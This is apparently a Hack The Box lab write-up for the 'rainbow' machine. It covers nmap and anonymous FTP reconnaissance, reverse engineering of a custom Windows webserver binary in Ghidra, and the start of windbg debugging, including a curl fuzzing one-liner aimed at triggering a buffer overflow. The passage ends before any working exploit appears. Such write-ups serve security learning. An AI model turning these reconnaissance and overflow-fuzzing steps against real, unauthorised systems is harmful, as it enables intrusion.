<span class="s2">SF:ip:\x20text;\n\x20\t\tcolor:\x20transparent;\n\t}\n\tbody\x20{\n\x20\x2</span>
<span class="s2">SF:0\t\tdisplay:\x20flex;\n\x20\x20\t\tjustify-content:\x20center;\n\x20\t</span>
<span class="s2">SF:\t\x20align-items:\x20center;\n\x20\x20\t\ttext-align:\x20center;\n\x20</span>
<span class="s2">SF:\x20\t\tmin-height:\x20100vh;\n\t}\n\x20\x20\x20\x20&lt;/style&gt;\n&lt;/head&gt;\n</span>
<span class="s2">SF:&lt;body&gt;\n\x20\x20\x20\x20&lt;!--\x20\xf0\x9f\x8c\x88\x20Under\x20Developmen</span>
<span class="s2">SF:t,\x20please\x20come\x20back\x20later\x20--&gt;\n\n\n\x20\x20\x20\x20\x20&lt;</span>
<span class="s2">SF:pre\x20class=\"rainbow\"&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span>
<span class="s2">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\.--'_</span>
<span class="s2">SF:\.\.\.\.\.\.----\.\.\.\.\.\.\.\.\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\</span>
<span class="s2">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_,i,,-''\x20</span>
<span class="s2">SF:__,,\.\.\.\.\.\.\.\.\.\.\.___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span>
<span class="s2">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20,;-'\x20_\.--''\x20\x20</span>
<span class="s2">SF:\x20\x20___,,\.\.\."</span><span class="o">)</span><span class="p">;</span>
Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose
Running<span class="w"> </span><span class="o">(</span>JUST<span class="w"> </span>GUESSING<span class="o">)</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">2019</span><span class="p">|</span><span class="m">10</span><span class="w"> </span><span class="o">(</span><span class="m">97</span>%<span class="o">)</span>
OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2019<span class="w"> </span>cpe:/o:microsoft:windows_10
Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="o">(</span><span class="m">97</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">1903</span><span class="w"> </span>-<span class="w"> </span>21H1<span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>
No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows

Host<span class="w"> </span>script<span class="w"> </span>results:
<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>but<span class="w"> </span>not<span class="w"> </span>required
<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>2s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>2s
<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-10-25T18:44:10
<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A

TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">21</span>/tcp<span class="o">)</span>
HOP<span class="w"> </span>RTT<span class="w">       </span>ADDRESS
<span class="m">1</span><span class="w">   </span><span class="m">162</span>.97<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.14.1
<span class="m">2</span><span class="w">   </span><span class="m">163</span>.08<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.129.234.171

OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">243</span>.61<span class="w"> </span>seconds
</code></pre></div>
<p>The machine doesn't have ports typically associated with domain controllers exposed.  But it does have FTP exposed, and its allowing anonymous login:
</p><div class="highlight"><pre><span></span><code><span class="m">21</span>/tcp<span class="w">   </span>open<span class="w">  </span>ftp<span class="w">           </span>Microsoft<span class="w"> </span>ftpd
<span class="p">|</span><span class="w"> </span>ftp-syst:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>SYST:<span class="w"> </span>Windows_NT
<span class="p">|</span><span class="w"> </span>ftp-anon:<span class="w"> </span>Anonymous<span class="w"> </span>FTP<span class="w"> </span>login<span class="w"> </span>allowed<span class="w"> </span><span class="o">(</span>FTP<span class="w"> </span>code<span class="w"> </span><span class="m">230</span><span class="o">)</span>
<span class="p">|</span><span class="w"> </span><span class="m">01</span>-18-22<span class="w">  </span><span class="m">08</span>:22AM<span class="w">                  </span><span class="m">258</span><span class="w"> </span>dev.txt
<span class="p">|</span><span class="w"> </span><span class="m">01</span>-18-22<span class="w">  </span><span class="m">08</span>:30AM<span class="w">                </span><span class="m">54784</span><span class="w"> </span>rainbow.exe
<span class="p">|</span><span class="w"> </span><span class="m">01</span>-16-22<span class="w">  </span><span class="m">01</span>:34PM<span class="w">                  </span><span class="m">479</span><span class="w"> </span>restart.ps1
<span class="p">|</span>_01-16-22<span class="w">  </span><span class="m">12</span>:14PM<span class="w">       </span>&lt;DIR&gt;<span class="w">          </span>wwwroot
</code></pre></div><p></p>
<p>Download the files
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
└─$<span class="w"> </span>ftp<span class="w"> </span>rainbow.htb
Connected<span class="w"> </span>to<span class="w"> </span>rainbow.htb.
<span class="m">220</span><span class="w"> </span>Microsoft<span class="w"> </span>FTP<span class="w"> </span>Service
Name<span class="w"> </span><span class="o">(</span>rainbow.htb:notroot<span class="o">)</span>:<span class="w"> </span>Anonymous
<span class="m">331</span><span class="w"> </span>Anonymous<span class="w"> </span>access<span class="w"> </span>allowed,<span class="w"> </span>send<span class="w"> </span>identity<span class="w"> </span><span class="o">(</span>e-mail<span class="w"> </span>name<span class="o">)</span><span class="w"> </span>as<span class="w"> </span>password.
Password:<span class="w"> </span>
<span class="m">230</span><span class="w"> </span>User<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>.
Remote<span class="w"> </span>system<span class="w"> </span><span class="nb">type</span><span class="w"> </span>is<span class="w"> </span>Windows_NT.
ftp&gt;<span class="w"> </span>ls
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">50101</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">01</span>-18-22<span class="w">  </span><span class="m">08</span>:22AM<span class="w">                  </span><span class="m">258</span><span class="w"> </span>dev.txt
<span class="m">01</span>-18-22<span class="w">  </span><span class="m">08</span>:30AM<span class="w">                </span><span class="m">54784</span><span class="w"> </span>rainbow.exe
<span class="m">01</span>-16-22<span class="w">  </span><span class="m">01</span>:34PM<span class="w">                  </span><span class="m">479</span><span class="w"> </span>restart.ps1
<span class="m">01</span>-16-22<span class="w">  </span><span class="m">12</span>:14PM<span class="w">       </span>&lt;DIR&gt;<span class="w">          </span>wwwroot
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
ftp&gt;<span class="w"> </span>binary
<span class="m">200</span><span class="w"> </span>Type<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span>I.
ftp&gt;<span class="w"> </span>mget<span class="w"> </span>*
mget<span class="w"> </span>dev.txt<span class="w"> </span><span class="o">[</span>anpqy?<span class="o">]</span>?<span class="w"> </span>a
Prompting<span class="w"> </span>off<span class="w"> </span><span class="k">for</span><span class="w"> </span>duration<span class="w"> </span>of<span class="w"> </span>mget.
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">50103</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">100</span>%<span class="w"> </span><span class="p">|</span>***********************************************************************<span class="p">|</span><span class="w">   </span><span class="m">258</span><span class="w">        </span><span class="m">2</span>.51<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETA
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
<span class="m">258</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="o">(</span><span class="m">2</span>.47<span class="w"> </span>KiB/s<span class="o">)</span>
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">50104</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">100</span>%<span class="w"> </span><span class="p">|</span>***********************************************************************<span class="p">|</span><span class="w"> </span><span class="m">54784</span><span class="w">      </span><span class="m">172</span>.75<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETA
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
<span class="m">54784</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="o">(</span><span class="m">172</span>.63<span class="w"> </span>KiB/s<span class="o">)</span>
<span class="m">229</span><span class="w"> </span>Entering<span class="w"> </span>Extended<span class="w"> </span>Passive<span class="w"> </span>Mode<span class="w"> </span><span class="o">(||</span><span class="p">|</span><span class="m">50105</span><span class="p">|</span><span class="o">)</span>
<span class="m">125</span><span class="w"> </span>Data<span class="w"> </span>connection<span class="w"> </span>already<span class="w"> </span>open<span class="p">;</span><span class="w"> </span>Transfer<span class="w"> </span>starting.
<span class="m">100</span>%<span class="w"> </span><span class="p">|</span>***********************************************************************<span class="p">|</span><span class="w">   </span><span class="m">479</span><span class="w">        </span><span class="m">4</span>.79<span class="w"> </span>KiB/s<span class="w">    </span><span class="m">00</span>:00<span class="w"> </span>ETA
<span class="m">226</span><span class="w"> </span>Transfer<span class="w"> </span>complete.
<span class="m">479</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="o">(</span><span class="m">4</span>.76<span class="w"> </span>KiB/s<span class="o">)</span>
</code></pre></div><p></p>
<p>The <code>dev.txt</code> calls out a <code>restart script</code> and mentions that the application is rotated through ports <code>8080-8090</code> when the webapp crashes.
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/rainbow/dump<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>dev.txt<span class="w"> </span>
*<span class="w"> </span>Our<span class="w"> </span>webserver<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>crashing<span class="w"> </span>a<span class="w"> </span>lot<span class="w"> </span>lately.<span class="w"> </span>Instead<span class="w"> </span>of<span class="w"> </span>touching<span class="w"> </span>the<span class="w"> </span>code<span class="w"> </span>we<span class="w"> </span>added<span class="w"> </span>a<span class="w"> </span>restart<span class="w"> </span>script!<span class="w"> </span>
*<span class="w"> </span>The<span class="w"> </span>server<span class="w"> </span>will<span class="w"> </span>dynamically<span class="w"> </span>pick<span class="w"> </span>a<span class="w"> </span>port<span class="w"> </span>when<span class="w"> </span>its<span class="w"> </span>default<span class="w"> </span>port<span class="w"> </span>is<span class="w"> </span>unresponsive<span class="w"> </span><span class="o">(</span><span class="m">8080</span>-8090<span class="o">)</span>.
*<span class="w"> </span>We<span class="err">'</span>ll<span class="w"> </span>fix<span class="w"> </span>this<span class="w"> </span>later<span class="w"> </span>by<span class="w"> </span>adding<span class="w"> </span>load<span class="w"> </span>balancer.

-<span class="w"> </span>dev<span class="w"> </span>team
</code></pre></div><p></p>
<p>The <code>restart.ps1</code> discloses that the adjacent <code>rainbow.exe</code> is found at <code>c:\rainbow\rainbow.exe</code>
</p><div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">notroot</span><span class="err">㉿</span><span class="n">elysium</span><span class="p">)-[(</span><span class="n">master</span><span class="p">)</span> <span class="n">1</span> <span class="p">~/</span><span class="n">htb</span><span class="p">/</span><span class="n">machines</span><span class="p">/</span><span class="n">rainbow</span><span class="p">/</span><span class="n">dump</span><span class="p">]</span>
<span class="err">└─</span><span class="p">$</span> <span class="nb">cat </span><span class="n">restart</span><span class="p">.</span><span class="n">ps1</span> 
<span class="nb">Set-Location</span> <span class="n">-Path</span> <span class="n">c</span><span class="p">:\</span><span class="n">rainbow</span>
<span class="k">for</span><span class="p">(;;){</span>
<span class="k">try</span><span class="p">{</span>
<span class="k">If</span> <span class="p">(!(</span><span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="n">rainbow</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span><span class="p">))</span>
<span class="p">{</span><span class="nb">Invoke-Expression</span> <span class="s2">"C:\rainbow\rainbow.exe"</span> <span class="p">}</span>
<span class="nv">$proc</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="n">rainbow</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">-Property</span> <span class="n">ProcessName</span> <span class="n">-Unique</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
<span class="k">If</span> <span class="p">(!</span><span class="nv">$proc</span> <span class="o">-or</span> <span class="p">(</span><span class="nv">$proc</span><span class="p">.</span><span class="n">Responding</span> <span class="o">-eq</span> <span class="nv">$false</span><span class="p">)</span> <span class="err">–</span><span class="n">or</span> <span class="p">(</span><span class="nv">$proc</span><span class="p">.</span><span class="n">WorkingSet</span> <span class="o">-GT</span> <span class="n">200000</span><span class="p">*</span><span class="n">1024</span><span class="p">))</span> <span class="p">{</span>
<span class="nv">$proc</span><span class="p">.</span><span class="n">Kill</span><span class="p">()</span>
<span class="nb">Start-Sleep</span> <span class="n">-s</span> <span class="n">10</span>
<span class="nb">Invoke-Expression</span> <span class="s2">"C:\rainbow\rainbow.exe"</span><span class="p">}</span>
<span class="p">}</span>
<span class="k">catch</span>    <span class="p">{</span>    <span class="p">}</span>
<span class="nb">Start-sleep</span> <span class="n">-s</span> <span class="n">30</span>
<span class="p">}</span>
</code></pre></div><p></p>
<p>Port 80 is a default IIS start page.
Port 8080 is the development webapp, its homepage aligns with the <code>index.html</code> found in the <code>wwwroot</code> directory in the FTP share.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025174111.png" data-desc-position="bottom"><img alt="Pasted_image_20251025174111.png" src="../../../../Pasted_image_20251025174111.png"></a></p>
<p>Anonymous access doesn't allow upload to the FTP share, so straight to webshell is off the table.</p>
<h1 id="static-analysis">Static Analysis<a class="headerlink" href="#static-analysis" title="Permanent link">¶</a></h1>
<p>I tried analyzing the <code>rainbow.exe</code> using <code>AvaloniaILSpy</code> (<a href="https://github.com/icsharpcode/AvaloniaILSpy">https://github.com/icsharpcode/AvaloniaILSpy</a>) but the executable isn't managed code:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025174908.png" data-desc-position="bottom"><img alt="Pasted_image_20251025174908.png" src="../../../../Pasted_image_20251025174908.png"></a></p>
<p>Examining the binary in <code>Ghidra</code>, I find that the binary has a number of imports, one of which is <code>ws2_32.dll</code>.  A good sign the binary features network connection-related operations.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025182226.png" data-desc-position="bottom"><img alt="Pasted_image_20251025182226.png" src="../../../../Pasted_image_20251025182226.png"></a></p>
<p>Following the entrypoint, a stack cookie is set up, and a single function is called, which had another name but I renamed it "main", which seems fitting in this context.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025182456.png" data-desc-position="bottom"><img alt="Pasted_image_20251025182456.png" src="../../../../Pasted_image_20251025182456.png"></a></p>
<p>Following the <code>main()</code> function, there is not much to be said about the first two -thirds of the function; likely initialization of the console.  However the near-end of the function starts a webserver, seems to get the address of a loaded module, and an ESI is returned if in good standing. All other scenarios lead to raising SEH exception.  </p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025183355.png" data-desc-position="bottom"><img alt="Pasted_image_20251025183355.png" src="../../../../Pasted_image_20251025183355.png"></a></p>
<p>Examining the <code>start_webserver()</code> function.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025185956.png" data-desc-position="bottom"><img alt="Pasted_image_20251025185956.png" src="../../../../Pasted_image_20251025185956.png"></a></p>
<p>The function on line 8 I named <code>std_cout</code>, because it seems like that's what its doing is directing stdout to console.</p>
<p>Lines 9 and 11  are setting the port range talked about in the <code>dev.txt</code>.   Well, not quite, because that said <code>8080-8090</code>, this clearly won't work for ports <code>8089</code> and <code>8090</code>. </p>
<div class="highlight"><pre><span></span><code>┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ echo "ibase=16; obase=A; 1F90" | bc
8080

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ echo "ibase=16; obase=A; 1F99" | bc
8089
</code></pre></div>
<p>Not entirely sure what the function on 14 is doing, my best guess is it is creating and storing a  <code>HostInfo</code>  struct.  The struct isn't used by the server, it's used by the client.</p>
<p>The function on line 15 I named <code>socket_bind_server</code> because I found it was calling a bunch of functions by ordinals, those ordinals align with <code>ws2_32</code> and I found them translate in the following order, which I commented inline in the disasm.  </p>
<div class="highlight"><pre><span></span><code>/* https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E 82C18B4677F89.html

/* WSAStartup  115  Exported Function */
/* socket  23  Exported Function */
/* WSAGetLastError  111  Exported Function */
/* htons  9  Exported Functio */
/* bind  2  Exported Function */
/* setsockopt  21  Exported Function */
/* listen  13  Exported Function */
</code></pre></div>
<p>The other function I named <code>sock_client</code> because I found it to be calling functions by ordinal that align with a spawned socket client:
</p><div class="highlight"><pre><span></span><code>/* select  18  Exported Function */
/* accept  1  Exported Function */
/* recv  16  Exported Function */
/* closesocket  3  Exported Function */
/* WSACleanup  116  Exported Function */
</code></pre></div><p></p>
<p>The client function will need a closer examination, because this is where there appears to be actual substance to the application.</p>
<p>On line 69, I see a zeroing of memory using <code>memset</code>.  This is followed by a <code>recv</code> of  0x1000 bytes, followed by a <code>closesocket</code>.  The <code>local_28</code> variable is passed to the call of <code>closesocket</code>, so it must be a socket handle for the client. Curiously, Lines 76-78 seem to iterate over the <code>recv</code>'d bytes like <code>(int x=0; x&lt;len(recvd); x=x+1)</code> like a for-range type iterator.  However what is strange is the comparison of the indexed value to the <code>local_28</code> client sock fdescriptor.  So we seem to be avoiding a buffer overflow by checking if we reached the fdescriptor at offset +5 of the iterator.  Basically looking ahead at the dword adjacent to the iterator. </p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025191934.png" data-desc-position="bottom"><img alt="Pasted_image_20251025191934.png" src="../../../../Pasted_image_20251025191934.png"></a></p>
<p>This is where things get interesting, because if we do manage to match to local_28, then a short jump to label <code>LAB_004019cb</code> occurs.  This looks like a shift left operation.  Every iteration, the byte pointed at by <code>local_14[local_18+5]</code> is reassigned the byte pointed at by <code>local_14[local_18+6]</code>.  There is no initializer in the for range loop, here we seem to be finishing off the remainder of the initial for range loop started on line 76. </p>
<p>Once the shift operation has finished, the dword pointed at by <code>local_14[4]</code> is decremented by 1.  Then <code>local_30</code> is incremented by 1.   Then a short jump back up to start an <code>accept</code>,  <code>recv</code> all over again (label <code>LAB_00401894</code>).</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025193932.png" data-desc-position="bottom"><img alt="Pasted_image_20251025193932.png" src="../../../../Pasted_image_20251025193932.png"></a></p>
<p>If for some reason we can get to the end of the iterator in the initial for range loop without ever matching <code>local_14[local_18 + 5]</code> to the client sock fdescriptor, we enter a whole other branch.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025195814.png" data-desc-position="bottom"><img alt="Pasted_image_20251025195814.png" src="../../../../Pasted_image_20251025195814.png"></a></p>
<p>Real quick, the three short jump labels go to 
1. increment local_30 +1 then go back to <code>accept</code>, <code>recv</code>
2. just go back to <code>accept</code>, <code>recv</code>
3. If we made it here, it is because there wasn't actually a client fdescriptor, all paths from here lead to WSACleanup (i.e., maybe lost connection).</p>
<p>The first function on line 87 is a slightly recursive function.  More on that in a  second.
The second function on line 89 is a check if a VirtualProcessor is available, if not then throw an error.
The third function on line 91 is also a check if a VirtualProcessor is available, if not then terminate().</p>
<p>So it appears that, if there is something important to do with the received buffer, as all other paths lead away from using the buffer, then it has to happen in the first function found on line 87.  Because after that between the five choices you have two functions that both terminate-equiv, two labels that get a new client recv, and a label that terminates.</p>
<p>Lets examine the function on line 87.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025200847.png" data-desc-position="bottom"><img alt="Pasted_image_20251025200847.png" src="../../../../Pasted_image_20251025200847.png"></a></p>
<p>I'm renaming this function <code>depth1</code></p>
<p>The <code>_unfancy()</code> function just returns whatever was passed to it.  In this way passed parameters get assigned to function-local variables.</p>
<p>The function call on line 18 is, for lack of a better term, obnoxious:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025201504.png" data-desc-position="bottom"><img alt="Pasted_image_20251025201504.png" src="../../../../Pasted_image_20251025201504.png"></a></p>
<p>We can skip close analysis of the first four function calls.  The first one, has deep recursion and at the end of all the recursion is obtaining structs.  I can't help but feel like its setting up for calling an SEH chain.  The other three are freeing memory and returning pointers to memory.  </p>
<p>The function of interest is the <code>beginthreadex</code> call on line 39,  it has a function as an argument.  If the application is going to do something interesting with the <code>recv</code> buffer, now is its chance, because the function calls on lines 43, 46, and 49 are either throw an error, or do garbage collection and return.  However with the preamble that leads up to it, it is most likely what calls the SEH chain.</p>
<p>Well, and this is a major disappointment.</p>
<p>I think that's exactly what it does.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025202851.png" data-desc-position="bottom"><img alt="Pasted_image_20251025202851.png" src="../../../../Pasted_image_20251025202851.png"></a></p>
<p>The first function on line 21 creates a compressed pair (???) , an obvious C++ construct related to optimization of empty memory storage (when empty).</p>
<p>The other function calls occurring between lines 21 and 31 are just using an alternate form of, turn arguments into local variables.  This time, from what I can tell, the parameters are those of the parent function's, as nothing was passed to this function.</p>
<p>Ah, but the function on line 33 is something else entirely.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025203742.png" data-desc-position="bottom"><img alt="Pasted_image_20251025203742.png" src="../../../../Pasted_image_20251025203742.png"></a></p>
<p>That looks an awful lot like a function pointer exec, save for the three argument being passed to it.  We can see that pointer-to-param1 is being cast as a pointer-to-code-pointer, and then getting called with three arguments.</p>
<p>There is nothing left to analyze here at the moment.</p>
<h1 id="dynamic-analysis">Dynamic analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">¶</a></h1>
<p>Only way forward is to debug it live.  The following can help expedite managing the lifecycle of the binary and attaching windbg to it.  one of the challenges is that the application blocks while its running, and it has console output .  So it has to be started as a background process and output redirected to a file while trying to one-liner starting and attaching to it.</p>
<p>Additionally I have set an initial breakpoint at the instruction that calls Ordinal_16 (recv).
</p><div class="highlight"><pre><span></span><code>c:<span class="se">\r</span>ainbow&gt;<span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM rainbow.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>rainbow.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x00401971; g'</span>
</code></pre></div><p></p>
<p>In <code>IDAPro</code>, that would actually be here:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251025221501.png" data-desc-position="bottom"><img alt="Pasted_image_20251025221501.png" src="../../../../Pasted_image_20251025221501.png"></a></p>
<p>To cause the application to hit the breakpoint, I can start with an initial curl command, although this is just a hello world; this is about to become a PoC.
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/rainbow/dump<span class="o">]</span>
└─$<span class="w"> </span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s2">"printf 'A'x0x1020"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://192.168.56.100:8080/index.html<span class="w"> </span>-d<span class="w"> </span><span class="s2">"fuzzed=</span><span class="k">$(</span>cat<span class="w"> </span>-<span class="k">)</span><span class="s2">"</span>
</code></pre></div><p></p>
<p>The convention for calling <code>ws2_32::recv</code></p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv">https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv</a></p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="n">WSAAPI</span><span class="w"> </span><span class="nf">recv</span><span class="p">(</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">  </span><span class="n">SOCKET</span><span class="w"> </span><span class="n">s</span><span class="p">,</span>
